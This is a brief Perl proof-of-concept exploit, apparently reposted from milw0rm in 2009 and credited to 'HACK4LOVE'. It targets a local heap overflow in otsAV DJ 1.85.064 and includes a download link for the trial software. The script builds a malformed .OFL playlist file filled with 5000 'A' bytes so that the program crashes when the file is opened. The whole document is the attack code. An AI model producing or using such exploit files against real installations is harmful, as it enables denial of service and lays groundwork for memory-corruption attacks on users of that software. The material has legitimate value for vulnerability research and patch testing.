#!/usr/bin/perl
# Found By :: HACK4LOVE
# all i want say welcom back 3asfh
# otsAV DJ 1.85.064 (.ofl File) Local Heap Overflow PoC
# http://x.download.otszone.com/static/otsavdjtrialsetup.exe
########################################################################################
my $crash="\x41" x 5000;
open(myfile,'>>hack4love.OFL');
print myfile $crash;
########################################################################################

# milw0rm.com [2009-07-09]
